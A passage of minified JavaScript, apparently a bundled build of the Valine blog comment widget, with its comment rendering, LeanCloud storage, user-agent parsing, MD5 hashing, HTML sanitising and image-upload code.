e.$nodata.show();e.$loading.hide()})).catch((function(t){e.$loading.hide(),(0,v.default)(e,t,"query")}))};e.Q(e.config.path).count().then((function(t){t>0?(e.$el.find(".vcount").show().find(".vnum").text(t),E()):e.$loading.hide()})).catch((function(t){(0,v.default)(e,t,"count")}));var A=function(t,n,r){var a=(0,d.default)('<div class="vcard" id="'+t.id+'"></div>'),o=t.get("ua"),s="";o&&!/ja/.test(e.config.lang)&&(s='<span class="vsys">'+(o=d.default.detect(o)).browser+" "+o.version+'</span> <span class="vsys">'+o.os+" "+o.osVersion+"</span>"),"*"===e.config.path&&(s='<a href="'+t.get("url")+'" class="vsys">'+t.get("url")+"</a>");var l=t.get("link")?/^https?\:\/\//.test(t.get("link"))?t.get("link"):"http://"+t.get("link"):"",c=l?'<a class="vnick" rel="nofollow" href="'+l+'" target="_blank" >'+t.get("nick")+"</a>":'<span class="vnick">'+t.get("nick")+"</span>",u=(x.hide?"":e.config.enableQQ&&t.get("QQAvatar")?'<img class="vimg" src="'+t.get("QQAvatar")+'" referrerPolicy="no-referrer"/>':'<img class="vimg" src="'+(x.cdn+(0,i.default)(t.get("mail"))+x.params)+'">')+'<div class="vh"><div class="vhead">'+c+" "+s+'</div><div class="vmeta"><span class="vtime" >'+(0,p.default)(t.get("insertedAt"),e.i18n)+'</span><span class="vat" data-vm-id="'+(t.get("rid")||t.id)+'" data-self-id="'+t.id+'">'+e.i18n.t("reply")+'</span></div><div class="vcontent" data-expand="'+e.i18n.t("expand")+'">'+(0,m.default)(t.get("comment"))+'</div><div class="vreply-wrapper" data-self-id="'+t.id+'"></div><div class="vquote" data-self-id="'+t.id+'"></div></div>';a.html(u);var g=a.find(".vat");a.find("a").forEach((function(e){e&&!(0,d.default)(e).hasClass("at")&&(0,d.default)(e).attr({target:"_blank",rel:"nofollow"})})),r?n.append(a):n.prepend(a);var h=a.find(".vcontent");h&&M(h),g&&I(g,t),L()},O={},I=function(t,n){t.on("click",(function(r){var a=t.attr("data-vm-id"),o=t.attr("data-self-id"),i=e.$el.find(".vwrap"),s="@"+d.default.escape(n.get("nick"));(0,d.default)('.vreply-wrapper[data-self-id="'+o+'"]').append(i).find(".cancel-reply").show(),O={at:d.default.escape(s)+" ",rid:a,pid:o,rmail:n.get("mail")},S.comment.attr({placeholder:s})[0].focus()}))},L=function(){setTimeout((function(){try{"MathJax"in window&&"version"in window.MathJax&&(/^3.*/.test(window.MathJax.version)&&MathJax.typeset()||MathJax.Hub.Queue(["Typeset",MathJax.Hub,document.querySelector(".v")])),"renderMathInElement"in window&&renderMathInElement((0,d.default)(".v")[0],{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})}catch(e){}}),100)},M=function(e){setTimeout((function(){e[0].offsetHeight>200&&(e.addClass("expand"),e.on("click",(function(t){e.removeClass("expand")})))}))};!function(t){if(t=d.default.store.get(u.MetaCacheKey)||t)for(var n in w){var r=w[n];e.$el.find(".v"+r).val(d.default.unescape(t[r])),b[r]=t[r]}var a=d.default.store.get(u.QQCacheKey);b.QQAvatar=e.config.enableQQ&&!!a&&a.pic||""}(),e.reset=function(){b.comment="",S.comment.val(""),k(S.comment),S.comment.attr("placeholder",e.config.placeholder),O={},e.$preview.hide(),e.$el.find(".vpanel").append(e.$el.find(".vwrap")),e.$el.find(".cancel-reply").hide(),y=""};var R=e.$el.find(".vsubmit"),D=function(t){if(e.config.requiredFields.indexOf("nick")>-1&&b.nick.length<3)return S.nick[0].focus(),void e.$el.find(".status-bar").text(""+e.i18n.t("nickFail")).empty(3e3);if(e.config.requiredFields.indexOf("mail")>-1&&!/[\w-\.]+@([\w-]+\.)+[a-z]{2,3}/.test(b.mail))return S.mail[0].focus(),void e.$el.find(".status-bar").text(""+e.i18n.t("mailFail")).empty(3e3);if(""!=y){b.comment=y,b.nick=b.nick||"Anonymous";var n=d.default.store.get("vlx");n&&Date.now()/1e3-n/1e3<20?e.$el.find(".status-bar").text(e.i18n.t("busy")).empty(3e3):N()}else S.comment[0].focus()},N=function(){d.default.store.set("vlx",Date.now()),R.attr({disabled:!0}),e.$loading.show(!0);var t=new(AV.Object.extend(e.config.clazzName||"Comment"));if(b.url=decodeURI(e.config.path),b.insertedAt=new Date,O.rid){var n=O.pid||O.rid;t.set("rid",O.rid),t.set("pid",n),b.comment=y.replace("<p>",'<p><a class="at" href="#'+n+'">'+O.at+"</a> , ")}for(var r in b)if(b.hasOwnProperty(r)){var a=b[r];t.set(r,a)}t.setACL(function(){var e=new AV.ACL;return e.setPublicReadAccess(!0),e.setPublicWriteAccess(!1),e}()),t.save().then((function(t){"Anonymous"!=b.nick&&d.default.store.set(u.MetaCacheKey,{nick:b.nick,link:b.link,mail:b.mail});var n=e.$el.find(".vnum");try{O.rid?A(t,(0,d.default)('.vquote[data-self-id="'+O.rid+'"]'),!0):(Number(n.text())?n.text(Number(n.text())+1):e.$el.find(".vcount").show().find(".vnum").text(Number(n.text())+1),A(t,e.$el.find(".vcards")),P.skip++),R.removeAttr("disabled"),e.$loading.hide(),e.reset()}catch(t){(0,v.default)(e,t,"save")}})).catch((function(t){(0,v.default)(e,t,"commitEvt")}))};R.on("click",D),(0,d.default)(document).on("keydown",(function(e){var t=(e=event||e).keyCode||e.which||e.charCode;(e.ctrlKey||e.metaKey)&&13===t&&D(),9===t&&"veditor"==(document.activeElement.id||"")&&(e.preventDefault(),j(o[0],"    "))})).on("paste",(function(e){var t="clipboardData"in e?e.clipboardData:e.originalEvent&&e.originalEvent.clipboardData||window.clipboardData;t&&$(t.items,!0)})),o.on("dragenter dragleave dragover drop",(function(e){e.stopPropagation(),e.preventDefault(),"drop"===e.type&&$(e.dataTransfer.items)}));var $=function(e,t){for(var n=[],r=0,a=e.length;r<a;r++){var i=e[r];if("string"===i.kind&&i.type.match("^text/html"))!t&&i.getAsString((function(e){e&&j(o[0],e.replace(/<[^>]+>/g,""))}));else if(-1!==i.type.indexOf("image")){n.push(i.getAsFile());continue}}F(n)},F=function t(n,r){r=r||0;var a=n.length;if(a>0){var i=n[r];R.attr({disabled:!0});var l="![Uploading "+i.name+"...]()";j(o[0],l),U(i,(function(c){500!=c.code?(o.val(o.val().replace(l,"!["+i.name+"]("+c.data.url+")\r\n")),(0,s.default)(o[0]),++r<a?t(n,r):R.removeAttr("disabled")):(o.val(o.val().replace(l,"")),(0,s.default)(o[0]),e.$el.find(".status-bar").text(c.msg).empty(3e3),R.removeAttr("disabled"))}))}},U=function(e,t){var n=new FormData;n.append("image",e),d.default.ajax({type:"post",url:"https://pic.alexhchu.com/api/upload",data:n,success:function(e){t&&t(e)}})}},e.exports=o,e.exports.default=o},function(e,t,n){"use strict";t.__esModule=!0;var r=function(e){return e&&e.__esModule?e:{default:e}}(n(0)),a=!1;t.default=function(e,t){if("AV"in window){var n=window.AV.version||window.AV.VERSION;parseInt(n.split(".")[0])>2?a=!!AV.applicationId&&!!AV.applicationKey:r.default.deleteInWin("AV",0)}a?t&&t():r.default.sdkLoader("//cdn.jsdelivr.net/npm/leancloud-storage@3/dist/av-min.js","AV",(function(n){var r,o="https://",i=e.app_id||e.appId,s=e.app_key||e.appKey;if(!e.serverURLs)switch(i.slice(-9)){case"-9Nh9j0Va":o+="tab.";break;case"-MdYXbMMI":o+="us."}r=e.serverURLs||o+"avoscloud.com",AV.init({appId:i,appKey:s,serverURLs:r}),a=!0,t&&t()}))}},function(e,t,n){"use strict";function r(e){return e&&e.__esModule?e:{default:e}}t.__esModule=!0;var a=r(n(37)),o=r(n(56)),i=r(n(57)),s=r(n(54)),l=r(n(55)),c={zh:o.default,"zh-cn":o.default,"zh-CN":o.default,"zh-TW":i.default,en:s.default,"en-US":s.default,ja:l.default,"ja-JP":l.default};t.default=function(e,t){return!c[e]&&e&&t&&(c[e]=t),new a.default({phrases:c[e||"zh"],locale:e})}},function(e,t,n){"use strict";t.__esModule=!0,t.default=function(e,t){if(e.$el&&e.$loading.hide().$nodata.hide(),"[object Error]"==={}.toString.call(t)){var n=t.code||t.message||t.error||"";if(isNaN(n))e.$el&&e.$nodata.show('<pre style="text-align:left;"> '+JSON.stringify(t)+"</pre>");else{var r=e.i18n.t("code-"+n),a=(r=="code-"+n?void 0:r)||t.message||t.error||"";101==n||-1==n?e.$nodata.show():e.$el&&e.$nodata.show('<pre style="text-align:left;">Code '+n+": "+a+"</pre>")}}else e.$el&&e.$nodata.show('<pre style="text-align:left;">'+JSON.stringify(t)+"</pre>")}},function(e,t,n){"use strict";function r(e){return e&&e.__esModule?e:{default:e}}t.__esModule=!0;var a=n(36),o=r(a),i=r(n(0)),s=r(n(6)),l=n(33),c=new a.Renderer;c.code=function(e,t){return'<pre><code class="hljs language-'+t+'">'+(t&&hljs.getLanguage(t)?hljs.highlight(t,e).value:i.default.escape(e))+"</code></pre>"},o.default.setOptions({renderer:"hljs"in window?c:new a.Renderer,highlight:function(e,t){return"hljs"in window?t&&hljs.getLanguage(t)&&hljs.highlight(t,e,!0).value||hljs.highlightAuto(e).value:l(e)},gfm:!0,tables:!0,breaks:!0,pedantic:!1,sanitize:!0,smartLists:!0,smartypants:!0,headerPrefi:"v-"}),t.default=function(e){return s.default.parse((0,o.default)(e))}},function(e,t,n){"use strict";t.__esModule=!0,t.recordIPFn=t.fetchQQFn=void 0;var r=function(e){return e&&e.__esModule?e:{default:e}}(n(0)),a=n(2);t.fetchQQFn=function(e,t){var n=r.default.store.get(a.QQCacheKey);n&&n.qq==e?t&&t(n):r.default.ajax({type:"POST",url:"//valine.api.ioliu.cn/getqqinfo",data:{qq:e},success:function(e){e.errmsg||(r.default.store.set(a.QQCacheKey,e),t&&t(e))}})},t.recordIPFn=function(e){r.default.sdkLoader("//api.ip.sb/jsonip?callback=getIP","getIP"),window.getIP=function(t){e&&e(t.ip),r.default.deleteInWin("getIP")}}},function(e,t,n){"use strict";var r=function(e){var t=o(e.getDate(),2),n=o(e.getMonth()+1,2);return o(e.getFullYear(),2)+"-"+n+"-"+t},a=function e(t){return t instanceof Date?t:!isNaN(t)||/^\d+$/.test(t)?new Date(parseInt(t)):/GMT/.test(t||"")?e(new Date(t).getTime()):(t=(t||"").replace(/(^\s*)|(\s*$)/g,"").replace(/\.\d+/,"").replace(/-/,"/").replace(/-/,"/").replace(/(\d)T(\d)/,"$1 $2").replace(/Z/," UTC").replace(/([+-]\d\d):?(\d\d)/," $1$2"),new Date(t))},o=function(e,t){for(var n=e.toString();n.length<t;)n="0"+n;return n};e.exports=function(e,t){if(!e)return"";try{var n=a(e).getTime(),o=(new Date).getTime()-n,i=Math.floor(o/864e5);if(0===i){var s=o%864e5,l=Math.floor(s/36e5);if(0===l){var c=s%36e5,u=Math.floor(c/6e4);if(0===u){var p=c%6e4;return Math.round(p/1e3)+" "+t.t("seconds")}return u+" "+t.t("minutes")}return l+" "+t.t("hours")}return i<0?t.t("now"):i<8?i+" "+t.t("days"):r(e)}catch(e){}}},function(e,t,n){"use strict";t.__esModule=!0;var r=function(e){return e&&e.__esModule?e:{default:e}}(n(51));t.default=function(e){return(0,r.default)(e,{onTagAttr:function(e,t,n,r){return a(e,t,n,r)},onIgnoreTagAttr:function(e,t,n,r){return a(e,t,n,r)}}).replace(/\<\/?div\>/gi,"")};var a=function(e,t,n,a){if(/code|pre|span/gi.test(e)){if("style"==t)return t+'="'+(/^color/gi.test(n)?n:"").replace(/(color:[#0-9a-fA-F]{1,6};?).+/gi,"$1")+'"';if("class"==t)return t+"='"+r.default.escapeAttrValue(n)+"'"}if("img"===e&&["src","class"].indexOf(t)>-1)return t+'="'+r.default.escapeAttrValue(n)+'" referrerPolicy="no-referrer" '}},function(e,t,n){var r;!function(a){"use strict";function o(e,t){var n=(65535&e)+(65535&t);return(e>>16)+(t>>16)+(n>>16)<<16|65535&n}function i(e,t,n,r,a,i){return o(function(e,t){return e<<t|e>>>32-t}(o(o(t,e),o(r,i)),a),n)}function s(e,t,n,r,a,o,s){return i(t&n|~t&r,e,t,a,o,s)}function l(e,t,n,r,a,o,s){return i(t&r|n&~r,e,t,a,o,s)}function c(e,t,n,r,a,o,s){return i(t^n^r,e,t,a,o,s)}function u(e,t,n,r,a,o,s){return i(n^(t|~r),e,t,a,o,s)}function p(e,t){e[t>>5]|=128<<t%32,e[14+(t+64>>>9<<4)]=t;var n,r,a,i,p,d=1732584193,g=-271733879,h=-1732584194,f=271733878;for(n=0;n<e.length;n+=16)r=d,a=g,i=h,p=f,d=s(d,g,h,f,e[n],7,-680876936),f=s(f,d,g,h,e[n+1],12,-389564586),h=s(h,f,d,g,e[n+2],17,606105819),g=s(g,h,f,d,e[n+3],22,-1044525330),d=s(d,g,h,f,e[n+4],7,-176418897),f=s(f,d,g,h,e[n+5],12,1200080426),h=s(h,f,d,g,e[n+6],17,-1473231341),g=s(g,h,f,d,e[n+7],22,-45705983),d=s(d,g,h,f,e[n+8],7,1770035416),f=s(f,d,g,h,e[n+9],12,-1958414417),h=s(h,f,d,g,e[n+10],17,-42063),g=s(g,h,f,d,e[n+11],22,-1990404162),d=s(d,g,h,f,e[n+12],7,1804603682),f=s(f,d,g,h,e[n+13],12,-40341101),h=s(h,f,d,g,e[n+14],17,-1502002290),d=l(d,g=s(g,h,f,d,e[n+15],22,1236535329),h,f,e[n+1],5,-165796510),f=l(f,d,g,h,e[n+6],9,-1069501632),h=l(h,f,d,g,e[n+11],14,643717713),g=l(g,h,f,d,e[n],20,-373897302),d=l(d,g,h,f,e[n+5],5,-701558691),f=l(f,d,g,h,e[n+10],9,38016083),h=l(h,f,d,g,e[n+15],14,-660478335),g=l(g,h,f,d,e[n+4],20,-405537848),d=l(d,g,h,f,e[n+9],5,568446438),f=l(f,d,g,h,e[n+14],9,-1019803690),h=l(h,f,d,g,e[n+3],14,-187363961),g=l(g,h,f,d,e[n+8],20,1163531501),d=l(d,g,h,f,e[n+13],5,-1444681467),f=l(f,d,g,h,e[n+2],9,-51403784),h=l(h,f,d,g,e[n+7],14,1735328473),d=c(d,g=l(g,h,f,d,e[n+12],20,-1926607734),h,f,e[n+5],4,-378558),f=c(f,d,g,h,e[n+8],11,-2022574463),h=c(h,f,d,g,e[n+11],16,1839030562),g=c(g,h,f,d,e[n+14],23,-35309556),d=c(d,g,h,f,e[n+1],4,-1530992060),f=c(f,d,g,h,e[n+4],11,1272893353),h=c(h,f,d,g,e[n+7],16,-155497632),g=c(g,h,f,d,e[n+10],23,-1094730640),d=c(d,g,h,f,e[n+13],4,681279174),f=c(f,d,g,h,e[n],11,-358537222),h=c(h,f,d,g,e[n+3],16,-722521979),g=c(g,h,f,d,e[n+6],23,76029189),d=c(d,g,h,f,e[n+9],4,-640364487),f=c(f,d,g,h,e[n+12],11,-421815835),h=c(h,f,d,g,e[n+15],16,530742520),d=u(d,g=c(g,h,f,d,e[n+2],23,-995338651),h,f,e[n],6,-198630844),f=u(f,d,g,h,e[n+7],10,1126891415),h=u(h,f,d,g,e[n+14],15,-1416354905),g=u(g,h,f,d,e[n+5],21,-57434055),d=u(d,g,h,f,e[n+12],6,1700485571),f=u(f,d,g,h,e[n+3],10,-1894986606),h=u(h,f,d,g,e[n+10],15,-1051523),g=u(g,h,f,d,e[n+1],21,-2054922799),d=u(d,g,h,f,e[n+8],6,1873313359),f=u(f,d,g,h,e[n+15],10,-30611744),h=u(h,f,d,g,e[n+6],15,-1560198380),g=u(g,h,f,d,e[n+13],21,1309151649),d=u(d,g,h,f,e[n+4],6,-145523070),f=u(f,d,g,h,e[n+11],10,-1120210379),h=u(h,f,d,g,e[n+2],15,718787259),g=u(g,h,f,d,e[n+9],21,-343485551),d=o(d,r),g=o(g,a),h=o(h,i),f=o(f,p);return[d,g,h,f]}function d(e){var t,n="",r=32*e.length;for(t=0;t<r;t+=8)n+=String.fromCharCode(e[t>>5]>>>t%32&255);return n}function g(e){var t,n=[];for(n[(e.length>>2)-1]=void 0,t=0;t<n.length;t+=1)n[t]=0;var r=8*e.length;for(t=0;t<r;t+=8)n[t>>5]|=(255&e.charCodeAt(t/8))<<t%32;return n}function h(e){var t,n,r="0123456789abcdef",a="";for(n=0;n<e.length;n+=1)t=e.charCodeAt(n),a+=r.charAt(t>>>4&15)+r.charAt(15&t);return a}function f(e){return unescape(encodeURIComponent(e))}function m(e){return function(e){return d(p(g(e),8*e.length))}(f(e))}function v(e,t){return function(e,t){var n,r,a=g(e),o=[],i=[];for(o[15]=i[15]=void 0,a.length>16&&(a=p(a,8*e.length)),n=0;n<16;n+=1)o[n]=909522486^a[n],i[n]=1549556828^a[n];return r=p(o.concat(g(t)),512+8*t.length),d(p(i.concat(r),640))}(f(e),f(t))}function b(e,t,n){return t?n?v(t,e):function(e,t){return h(v(e,t))}(t,e):n?m(e):function(e){return h(m(e))}(e)}void 0!==(r=function(){return b}.call(t,n,t,e))&&(e.exports=r)}()},function(e,t,n){"use strict";t.__esModule=!0,t.default=function(e){var t={},n={Trident:(e=e||navigator.userAgent).indexOf("Trident")>-1||e.indexOf("NET CLR")>-1,Presto:e.indexOf("Presto")>-1,WebKit:e.indexOf("AppleWebKit")>-1,Gecko:e.indexOf("Gecko/")>-1,Safari:e.indexOf("Safari")>-1,Edge:e.indexOf("Edge")>-1||e.indexOf("Edg")>-1,Chrome:e.indexOf("Chrome")>-1||e.indexOf("CriOS")>-1,IE:e.indexOf("MSIE")>-1||e.indexOf("Trident")>-1,Firefox:e.indexOf("Firefox")>-1||e.indexOf("FxiOS")>-1,"Firefox Focus":e.indexOf("Focus")>-1,Chromium:e.indexOf("Chromium")>-1,Opera:e.indexOf("Opera")>-1||e.indexOf("OPR")>-1,Vivaldi:e.indexOf("Vivaldi")>-1,Yandex:e.indexOf("YaBrowser")>-1,Kindle:e.indexOf("Kindle")>-1||e.indexOf("Silk/")>-1,360:e.indexOf("360EE")>-1||e.indexOf("360SE")>-1,UC:e.indexOf("UC")>-1||e.indexOf(" UBrowser")>-1,QQBrowser:e.indexOf("QQBrowser")>-1,QQ:e.indexOf("QQ/")>-1,Baidu:e.indexOf("Baidu")>-1||e.indexOf("BIDUBrowser")>-1,Maxthon:e.indexOf("Maxthon")>-1,Sogou:e.indexOf("MetaSr")>-1||e.indexOf("Sogou")>-1,LBBROWSER:e.indexOf("LBBROWSER")>-1,"2345Explorer":e.indexOf("2345Explorer")>-1,TheWorld:e.indexOf("TheWorld")>-1,XiaoMi:e.indexOf("MiuiBrowser")>-1,Quark:e.indexOf("Quark")>-1,Qiyu:e.indexOf("Qiyu")>-1,Wechat:e.indexOf("MicroMessenger")>-1,Taobao:e.indexOf("AliApp(TB")>-1,Alipay:e.indexOf("AliApp(AP")>-1,Weibo:e.indexOf("Weibo")>-1,Douban:e.indexOf("com.douban.frodo")>-1,Suning:e.indexOf("SNEBUY-APP")>-1,iQiYi:e.indexOf("IqiyiApp")>-1,Windows:e.indexOf("Windows")>-1,Linux:e.indexOf("Linux")>-1||e.indexOf("X11")>-1,macOS:e.indexOf("Macintosh")>-1,Android:e.indexOf("Android")>-1||e.indexOf("Adr")>-1,Ubuntu:e.indexOf("Ubuntu")>-1,FreeBSD:e.indexOf("FreeBSD")>-1,Debian:e.indexOf("Debian")>-1,"Windows Phone":e.indexOf("IEMobile")>-1||e.indexOf("Windows Phone")>-1,BlackBerry:e.indexOf("BlackBerry")>-1||e.indexOf("RIM")>-1||e.indexOf("BB10")>-1,MeeGo:e.indexOf("MeeGo")>-1,Symbian:e.indexOf("Symbian")>-1,iOS:e.indexOf("like Mac OS X")>-1,"Chrome OS":e.indexOf("CrOS")>-1,WebOS:e.indexOf("hpwOS")>-1,Mobile:e.indexOf("Mobi")>-1||e.indexOf("iPh")>-1||e.indexOf("480")>-1,Tablet:e.indexOf("Tablet")>-1||e.indexOf("Pad")>-1||e.indexOf("Nexus 7")>-1};n.Mobile&&(n.Mobile=!(e.indexOf("iPad")>-1));var r={browser:["Safari","Chrome","Edge","IE","Firefox","Firefox Focus","Chromium","Opera","Vivaldi","Yandex","Kindle","360","UC","QQBrowser","QQ","Baidu","Maxthon","Sogou","LBBROWSER","2345Explorer","TheWorld","XiaoMi","Quark","Qiyu","Wechat","Taobao","Alipay","Weibo","Douban","Suning","iQiYi"],os:["Windows","Linux","Mac OS","macOS","Android","Ubuntu","FreeBSD","Debian","iOS","Windows Phone","BlackBerry","MeeGo","Symbian","Chrome OS","WebOS"]};for(var a in r)if(r.hasOwnProperty(a))for(var o=0,i=r[a].length;o<i;o++){var s=r[a][o];n[s]&&(t[a]=s)}var l={Windows:function(){var t=e.replace(/^.*Windows NT ([\d.]+).*$/,"$1");return{6.4:"10",6.3:"8.1",6.2:"8",6.1:"7","6.0":"Vista",5.2:"XP",5.1:"XP","5.0":"2000"}[t]||t},Android:e.replace(/^.*Android ([\d.]+);.*$/,"$1"),iOS:e.replace(/^.*OS ([\d_]+) like.*$/,"$1").replace(/_/g,"."),Debian:e.replace(/^.*Debian\/([\d.]+).*$/,"$1"),"Windows Phone":e.replace(/^.*Windows Phone( OS)? ([\d.]+);.*$/,"$2"),macOS:e.replace(/^.*Mac OS X ([\d_]+).*$/,"$1").replace(/_/g,"."),WebOS:e.replace(/^.*hpwOS\/([\d.]+);.*$/,"$1"),BlackBerry:e.replace(/^.*BB([\d.]+);*$/,"$1")};t.osVersion="";var c=l[t.os];c&&(t.osVersion="function"==typeof c?c():c==e?"":c);var u={Safari:e.replace(/^.*Version\/([\d.]+).*$/,"$1"),Chrome:e.replace(/^.*Chrome\/([\d.]+).*$/,"$1").replace(/^.*CriOS\/([\d.]+).*$/,"$1"),IE:e.replace(/^.*MSIE ([\d.]+).*$/,"$1").replace(/^.*rv:([\d.]+).*$/,"$1"),Edge:e.replace(/^.*Edge?\/([\d.]+).*$/,"$1"),Firefox:e.replace(/^.*Firefox\/([\d.]+).*$/,"$1").replace(/^.*FxiOS\/([\d.]+).*$/,"$1"),"Firefox Focus":e.replace(/^.*Focus\/([\d.]+).*$/,"$1"),Chromium:e.replace(/^.*Chromium\/([\d.]+).*$/,"$1"),Opera:e.replace(/^.*Opera\/([\d.]+).*$/,"$1").replace(/^.*OPR\/([\d.]+).*$/,"$1"),Vivaldi:e.replace(/^.*Vivaldi\/([\d.]+).*$/,"$1"),Yandex:e.replace(/^.*YaBrowser\/([\d.]+).*$/,"$1"),Kindle:e.replace(/^.*Version\/([\d.]+).*$/,"$1"),Maxthon:e.replace(/^.*Maxthon\/([\d.]+).*$/,"$1"),QQBrowser:e.replace(/^.*QQBrowser\/([\d.]+).*$/,"$1"),QQ:e.replace(/^.*QQ\/([\d.]+).*$/,"$1"),Baidu:e.replace(/^.*BIDUBrowser[\s\/]([\d.]+).*$/,"$1"),UC:e.replace(/^.*UC?Browser\/([\d.]+).*$/,"$1"),Sogou:e.replace(/^.*SE ([\d.X]+).*$/,"$1").replace(/^.*SogouMobileBrowser\/([\d.]+).*$/,"$1"),"2345Explorer":e.replace(/^.*2345Explorer\/([\d.]+).*$/,"$1"),TheWorld:e.replace(/^.*TheWorld ([\d.]+).*$/,"$1"),XiaoMi:e.replace(/^.*MiuiBrowser\/([\d.]+).*$/,"$1"),Quark:e.replace(/^.*Quark\/([\d.]+).*$/,"$1"),Qiyu:e.replace(/^.*Qiyu\/([\d.]+).*$/,"$1"),Wechat:e.replace(/^.*MicroMessenger\/([\d.]+).*$/,"$1"),Taobao:e.replace(/^.*AliApp\(TB\/([\d.]+).*$/,"$1"),Alipay:e.replace(/^.*AliApp\(AP\/([\d.]+).*$/,"$1"),Weibo:e.replace(/^.*weibo__([\d.]+).*$/,"$1"),Douban:e.replace(/^.*com.douban.frodo\/([\d.]+).*$/,"$1"),Suning:e.replace(/^.*SNEBUY-APP([\d.]+).*$/,"$1"),iQiYi:e.replace(/^.*IqiyiVersion\/([\d.]+).*$/,"$1")};t.version="";var p=u[t.browser];return p&&(t.version="function"==typeof p?p():p==e?"":p),null==t.browser&&(t.browser="Unknow App"),t}},function(e,t,n){var r,a;a=function(e,t,n){function r(t,a,o){return o=Object.create(r.fn),t&&o.push.apply(o,t.addEventListener?[t]:""+t===t?/</.test(t)?((a=e.createElement(a)).innerHTML=t,a.children):a?(a=r(a)[0])?a[n](t):o:e[n](t):t),o}return r.fn=[],r.one=function(e,t){return r(e,t)[0]||null},r}(document,0,"querySelectorAll"),void 0!==(r=function(){return a}.apply(t,[]))&&(e.exports=r)},function(e,t,n){function r(e){return null==e}function a(e){(e=function(e){var t={};for(var n in e)t[n]=e[n];return t}(e||{})).whiteList=e.whiteList||o.whiteList,e.onAttr=e.onAttr||o.onAttr,e.onIgnoreAttr=e.onIgnoreAttr||o.onIgnoreAttr,e.safeAttrValue=e.safeAttrValue||o.safeAttrValue,this.options=e}var o=n(7),i=n(30);n(8),a.prototype.process=function(e){if(!(e=(e=e||"").toString()))return"";var t=this.options,n=t.whiteList,a=t.onAttr,o=t.onIgnoreAttr,s=t.safeAttrValue;return i(e,(function(e,t,i,l,c){var u=n[i],p=!1;if(!0===u?p=u:"function"==typeof u?p=u(l):u instanceof RegExp&&(p=u.test(l)),!0!==p&&(p=!1),l=s(i,l)){var d,g={position:t,sourcePosition:e,source:c,isWhite:p};return p?r(d=a(i,l,g))?i+":"+l:d:r(d=o(i,l,g))?void 0:d}}))},e.exports=a},function(e,t,n){var r=n(8);e.exports=function(e,t){function n(){if(!o){var n=r.trim(e.slice(i,s)),a=n.indexOf(":");if(-1!==a){var c=r.trim(n.slice(0,a)),u=r.trim(n.slice(a+1));if(c){var p=t(i,l.length,c,u,n);p&&(l+=p+"; ")}}}i=s+1}";"!==(e=r.trimRight(e))[e.length-1]&&(e+=";");for(var a=e.length,o=!1,i=0,s=0,l="";s<a;s++){var c=e[s];if("/"===c&&"*"===e[s+1]){var u=e.indexOf("*/",s+2);if(-1===u)break;i=(s=u+1)+1,o=!1}else"("===c?o=!0:")"===c?o=!1:";"===c?o||n():"\n"===c&&n()}return r.trim(l)}},function(e,t,n){"use strict";var r=n(35),a=Object.prototype.toString,o=Object.prototype.hasOwnProperty,i=function(e,t,n){for(var r=0,a=e.length;r<a;r++)o.call(e,r)&&(null==n?t(e[r],r,e):t.call(n,e[r],r,e))},s=function(e,t,n){for(var r=0,a=e.length;r<a;r++)null==n?t(e.charAt(r),r,e):t.call(n,e.charAt(r),r,e)},l=function(e,t,n){for(var r in e)o.call(e,r)&&(null==n?t(e[r],r,e):t.call(n,e[r],r,e))};e.exports=function(e,t,n){if(!r(t))throw new TypeError("iterator must be a function");var o;arguments.length>=3&&(o=n),"[object Array]"===a.call(e)?i(e,t,o):"string"==typeof e?s(e,t,o):l(e,t,o)}},function(e,t,n){"use strict";var r=Array.prototype.slice,a=Object.prototype.toString;e.exports=function(e){var t=this;if("function"!=typeof t||"[object Function]"!==a.call(t))throw new TypeError("Function.prototype.bind called on incompatible "+t);for(var n,o=r.call(arguments,1),i=function(){if(this instanceof n){var a=t.apply(this,o.concat(r.call(arguments)));return Object(a)===a?a:this}return t.apply(e,o.concat(r.call(arguments)))},s=Math.max(0,t.length-o.length),l=[],c=0;c<s;c++)l.push("$"+c);if(n=Function("binder","return function ("+l.join(",")+"){ return binder.apply(this,arguments); }")(i),t.prototype){var u=function(){};u.prototype=t.prototype,n.prototype=new u,u.prototype=null}return n}},function(e,t,n){e.exports=function(){"use strict";var e=function(e,t){return function(e){var t=e.exports=function(){return new RegExp("(?:"+t.line().source+")|(?:"+t.block().source+")","gm")};t.line=function(){return/(?:^|\s)\/\/(.+?)$/gm},t.block=function(){return/\/\*([\S\s]*?)\*\//gm}}(t={exports:{}}),t.exports}(),t=["23AC69","91C132","F19726","E8552D","1AAB8E","E1147F","2980C1","1BA1E6","9FA0A0","F19726","E30B20","E30B20","A3338B"];return function(n,r){void 0===r&&(r={});var a=r.colors;void 0===a&&(a=t);var o=0,i={},s=new RegExp("("+/[\u4E00-\u9FFF\u3400-\u4dbf\uf900-\ufaff\u3040-\u309f\uac00-\ud7af\u0400-\u04FF]+|\w+/.source+"|"+/</.source+")|("+e().source+")","gmi");return n.replace(s,(function(e,t,n){if(n)return function(e){return'<span style="color: slategray">'+e+"</span>"}(n);if("<"===t)return"&lt;";var r;i[t]?r=i[t]:(r=a[o],i[t]=r);var s='<span style="color: #'+r+'">'+t+"</span>";return o=++o%a.length,s}))}}()},function(e,t,n){"use strict";var r=n(4);e.exports=r.call(Function.call,Object.prototype.hasOwnProperty)},function(e,t,n){"use strict";var r=Function.prototype.toString,a=/^\s*class\b/,o=function(e){try{var t=r.call(e);return a.test(t)}catch(e){return!1}},i=Object.prototype.toString,s="function"==typeof Symbol&&"symbol"==typeof Symbol.toStringTag;e.exports=function(e){if(!e)return!1;if("function"!=typeof e&&"object"!=typeof e)return!1;if("function"==typeof e&&!e.prototype)return!0;if(s)return function(e){try{return!o(e)&&(r.call(e),!0)}catch(e){return!1}}(e);if(o(e))return!1;var t=i.call(e);return"[object Function]"===t||"[object GeneratorFunction]"===t}},function(e,t,n){(function(t){!function(t){"use strict";function n(e){this.tokens=[],this.tokens.links={},this.options=e||h.defaults,this.rules=f.normal,this.options.pedantic?this.rules=f.pedantic:this.options.gfm&&(this.options.tables?this.rules=f.tables:this.rules=f.gfm)}function r(e,t){if(this.options=t||h.defaults,this.links=e,this.rules=m.normal,this.renderer=this.options.renderer||new a,this.renderer.options=this.options,!this.links)throw new Error("Tokens array requires a `links` property.");this.options.pedantic?this.rules=m.pedantic:this.options.gfm&&(this.options.breaks?this.rules=m.breaks:this.rules=m.gfm)}function a(e){this.options=e||h.defaults}function o(){}function i(e){this.tokens=[],this.token=null,this.options=e||h.defaults,this.options.renderer=this.options.renderer||new a,this.renderer=this.options.renderer,this.renderer.options=this.options}function s(e,t){return 